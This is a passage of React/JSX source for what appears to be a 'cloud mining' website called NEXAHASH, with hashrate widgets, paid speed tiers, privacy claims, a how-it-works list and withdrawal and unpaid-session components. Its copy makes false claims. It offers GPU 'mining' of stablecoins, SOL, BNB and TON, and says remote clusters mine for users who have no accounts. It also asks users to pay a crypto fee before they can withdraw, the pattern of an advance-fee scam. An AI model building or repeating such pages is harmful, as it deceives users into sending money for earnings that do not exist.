                    {sessionLocked ? null : idleHashrate.hashrate}
                  </div>
                  <div
                    className="metric-usd volatility-metric"
                    id="hashrateUnit"
                    ref={hashrateUnitRef}
                    suppressHydrationWarning
                  >
                    {sessionLocked ? null : idleHashrate.unit}
                  </div>
                </div>
                <div className="metric-box">
                  <div className="label">Session</div>
                  <div className="value" id="sessionTime" ref={sessionTimeRef}>00:00:00</div>
                  <div className="metric-usd" id="coinPrice">
                    {currentCoinData.ticker} Price: {currentCoinData.price}
                  </div>
                </div>
                <div className="metric-box">
                  <div className="label">Est/hr</div>
                  <div
                    className="value volatility-metric"
                    id="estEarnings"
                    ref={estEarningsRef}
                    suppressHydrationWarning
                  >
                    {sessionLocked ? null : idleEst.estCrypto}
                  </div>
                  <div
                    className="metric-usd volatility-metric"
                    id="estUsd"
                    ref={estUsdRef}
                    suppressHydrationWarning
                  >
                    {sessionLocked ? null : idleEst.estUsd}
                  </div>
                </div>
              </div>

              <div className="speed-selector" id="speedSelector">
                <div className="speed-label">Cluster Power</div>
                <div className="speed-options" id="speedOptions">
                  <div
                    className={`speed-opt ${activeSpeed === 0 ? 'active' : ''}`}
                    onClick={() => {
                      if (miningButtonActive) return;
                      setSpeedTier(0);
                    }}
                  >
                    <span className="speed-name">Standard</span>
                    <span className="speed-meta">1x · 8% fee</span>
                  </div>
                  <div
                    className={`speed-opt ${activeSpeed === 1 ? 'active' : ''}`}
                    onClick={() => {
                      if (miningButtonActive) return;
                      setSpeedTier(1);
                    }}
                  >
                    <span className="speed-name">Boosted</span>
                    <span className="speed-meta">2.5x · 9% fee</span>
                  </div>
                  <div
                    className={`speed-opt ${activeSpeed === 2 ? 'active' : ''}`}
                    onClick={() => {
                      if (miningButtonActive) return;
                      setSpeedTier(2);
                    }}
                  >
                    <span className="speed-name">Turbo</span>
                    <span className="speed-meta">6x · 10% fee</span>
                  </div>
                  <div
                    className={`speed-opt ${activeSpeed === 3 ? 'active' : ''}`}
                    onClick={() => {
                      if (miningButtonActive) return;
                      setSpeedTier(3);
                    }}
                  >
                    <span className="speed-name">Max Power</span>
                    <span className="speed-meta">14x · 11% fee</span>
                  </div>
                </div>
              </div>

              <div className="mine-controls">
                <button
                  className={`mine-btn ${miningButtonActive ? 'stop' : 'start'}`}
                  id="mineBtn"
                  onClick={handleMineBtnClick}
                >
                  {miningButtonActive ? 'STOP MINING' : 'START MINING'}
                </button>
              </div>

              <div className="session-progress">
                <div className="progress-header">
                  <span>Session Progress</span>
                  <span id="progressPct" ref={progressPctRef}>0%</span>
                </div>
                <div className="progress-track">
                  <div className="progress-fill" id="progressFill" ref={progressFillRef} style={{ transform: 'scaleX(0)' }}></div>
                </div>
              </div>

              <div className="device-notice">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2v-4M9 21H5a2 2 0 01-2-2v-4"></path>
                  <rect x="13" y="9" width="4" height="6" rx="1"></rect>
                </svg>
                <span>Your device resources are not used. All mining is performed on our datacenter GPU clusters.</span>
              </div>
            </div>
          </div>

          {/* Bottom Dashboard Section: Live Log & Past Sessions */}
          <div className="mine-bottom">
            {/* Live Log */}
            <div className="mine-card">
              <h3>Live Log</h3>
              <div className="live-log" id="liveLog" ref={liveLogRef} />
            </div>

            {/* Past Sessions */}
            <div className="mine-card">
              <h3>Past Sessions</h3>
              <div className="session-list" id="sessionList">
                {history.length === 0 ? (
                  <div className="no-sessions" style={{ color: '#71717a', fontSize: '0.9rem', padding: '1rem 0' }}>
                    No past sessions found.
                  </div>
                ) : (
                  history.map((sessionItem, index) => (
                    <div key={sessionItem.sessionId + index} className="session-entry">
                      <span className="s-coin">{sessionItem.coin}</span>
                      <span className="s-amount">+{sessionItem.amount.toFixed(8)}</span>
                      <span className="s-code">{sessionItem.sessionId}</span>
                      <span className="s-date">{sessionItem.date}</span>
                    </div>
                  ))
                )}
              </div>
              <button className="clear-btn" onClick={clearHistory}>Clear History</button>
            </div>
          </div>
        </div>
      </section>
      {/* ─── KNOWLEDGE / PRIVACY SECTION ─── */}
      <section id="privacy" className="knowledge-section">
        <div className="container">
          <div className="privacy-grid fade-up visible">
            <div className="privacy-visual">
              <div className="shield-wrap">
                <div className="shield-rings">
                  <div className="sr"></div>
                  <div className="sr"></div>
                  <div className="sr"></div>
                </div>
                <svg viewBox="0 0 200 240" fill="none">
                  <path d="M100 10 L185 50 L185 130 Q185 200 100 230 Q15 200 15 130 L15 50 Z" stroke="url(#sg)" strokeWidth="2" fill="rgba(236,117,5,0.03)"></path>
                  <path d="M80 125 L95 140 L125 105" stroke="#ffae19" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"></path>
                  <defs>
                    <linearGradient id="sg" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#EC7505"></stop>
                      <stop offset="100%" stopColor="#ffae19"></stop>
                    </linearGradient>
                  </defs>
                </svg>
              </div>
            </div>

            <div className="privacy-content">
              <span className="section-tag">// Zero-Knowledge Architecture</span>
              <h2>Your Privacy Is Not a Feature. It's the Foundation.</h2>
              <p>NEXAHASH is built on a radical premise: your mining data belongs to you alone. We engineered our platform around session-based local storage — not because it was easy, but because it was right.</p>
              <p>Every session, every earning, every configuration lives exclusively in your browser's localStorage. No server databases. No user accounts. No KYC. No analytics. No cookies. Nothing leaves your machine.</p>

              <ul className="privacy-points">
                <li>
                  <span className="icon-check">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                      <path d="M5 13l4 4L19 7"></path>
                    </svg>
                  </span>
                  <div><strong>Anti-KYC by design</strong> — No identity documents, no personal data, no verification</div>
                </li>
                <li>
                  <span className="icon-check">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                      <path d="M5 13l4 4L19 7"></path>
                    </svg>
                  </span>
                  <div><strong>localStorage only</strong> — All data stored locally. Clear anytime, gone forever</div>
                </li>
                <li>
                  <span className="icon-check">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                      <path d="M5 13l4 4L19 7"></path>
                    </svg>
                  </span>
                  <div><strong>Zero tracking</strong> — No analytics, fingerprinting, cookies, or server logs</div>
                </li>
                <li>
                  <span className="icon-check">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                      <path d="M5 13l4 4L19 7"></path>
                    </svg>
                  </span>
                  <div><strong>Open architecture</strong> — Inspect the code yourself. What you see is what runs</div>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>
      {/* ─── PLATFORM CAPABILITIES SECTION ─── */}
      <section id="capabilities" className="features-section">
        <div className="container">
          <div className="section-header fade-up visible">
            <span className="section-tag">// Platform Capabilities</span>
            <h2 className="section-title">Built for Serious Miners</h2>
          </div>
          <div className="features-grid fade-up visible">
            <div className="feature-card">
              <div className="feature-icon" style={{ background: 'rgba(0,232,255,0.08)' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00e8ff" strokeWidth="2">
                  <rect x="4" y="4" width="16" height="16" rx="2"></rect>
                  <path d="M9 9h6M9 12h6M9 15h4"></path>
                </svg>
              </div>
              <h3>GPU Cluster Access</h3>
              <p>Enterprise-grade GPU farms across multiple data centers. No hardware purchases required.</p>
            </div>
            <div className="feature-card">
              <div className="feature-icon" style={{ background: 'rgba(108,92,231,0.08)' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#6c5ce7" strokeWidth="2">
                  <circle cx="12" cy="12" r="10"></circle>
                  <path d="M12 6v6l4 2"></path>
                </svg>
              </div>
              <h3>20-Min Sessions</h3>
              <p>Optimized 20-minute session windows for maximum cluster efficiency with automatic resource allocation.</p>
            </div>
            <div className="feature-card">
              <div className="feature-icon" style={{ background: 'rgba(0,214,143,0.08)' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00d68f" strokeWidth="2">
                  <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
                </svg>
              </div>
              <h3>Multi-Chain Mining</h3>
              <p>Mine BTC, ETH, SOL, TON, XMR, DOGE, BNB, and more — switch instantly.</p>
            </div>
            <div className="feature-card">
              <div className="feature-icon" style={{ background: 'rgba(255,71,87,0.08)' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ff4757" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                </svg>
              </div>
              <h3>Zero Data Collection</h3>
              <p>No accounts, no KYC, no tracking. Full anonymity with localStorage-only architecture.</p>
            </div>
            <div className="feature-card">
              <div className="feature-icon" style={{ background: 'rgba(255,165,2,0.08)' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffa502" strokeWidth="2">
                  <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
                </svg>
              </div>
              <h3>Instant Deployment</h3>
              <p>No installation, no config. Open the page, select your coin, start mining in seconds.</p>
            </div>
            <div className="feature-card">
              <div className="feature-icon" style={{ background: 'rgba(0,200,255,0.08)' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00c8ff" strokeWidth="2">
                  <circle cx="12" cy="12" r="3"></circle>
                  <path d="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4M4.22 19.78l2.83-2.83M16.95 7.05l2.83-2.83"></path>
                </svg>
              </div>
              <h3>Transparent Fees</h3>
              <p>Simple 10% infrastructure fee on mined earnings. No hidden charges. Pay in crypto.</p>
            </div>
          </div>
        </div>
      </section>
      {/* ─── HOW IT WORKS SECTION ─── */}
      <section id="how-it-works" className="howto-section">
        <div className="container">
          <div className="section-header fade-up visible">
            <span className="section-tag">// Getting Started</span>
            <h2 className="section-title">How It Works</h2>
          </div>
          <div className="steps fade-up visible">
            <div className="step">
              <div className="step-num">01</div>
              <div className="step-content">
                <h3>Select Coin</h3>
                <p>Choose from 10+ supported cryptocurrencies including BTC, ETH, BNB, SOL, and stablecoins</p>
              </div>
            </div>
            <div className="step">
              <div className="step-num">02</div>
              <div className="step-content">
                <h3>Start Mining</h3>
                <p>Hit start and our datacenter clusters allocate GPU resources to your session</p>
              </div>
            </div>
            <div className="step">
              <div className="step-num">03</div>
              <div className="step-content">
                <h3>Earn Crypto</h3>
                <p>Watch your balance grow in real-time. Sessions run up to 20 minutes</p>
              </div>
            </div>
            <div className="step">
              <div className="step-num">04</div>
              <div className="step-content">
                <h3>Pay &amp; Withdraw</h3>
                <p>Pay the 10% infrastructure fee in crypto and receive your mined earnings</p>
              </div>
            </div>
          </div>
        </div>
      </section>
      {/* ─── FAQ SECTION ─── */}
      <section id="faq" className="faq-section">
        <div className="container">
          <div className="section-header fade-up visible">
            <span className="section-tag">// FAQ</span>
            <h2 className="section-title">Frequently Asked Questions</h2>
          </div>
          <div className="faq-list fade-up visible">
            {FAQ_ITEMS.map((item, i) => (
              <FaqItem key={i} question={item.q} answer={item.a} />
            ))}
          </div>
        </div>
      </section>
      {/* Centralized Withdrawal Modal Rendered via React Portal Outside main DOM tree */}
      <WithdrawalModal />

      {/* Unpaid Sessions Banner & Modal */}
      <UnpaidBanner />
    </>
  );
}
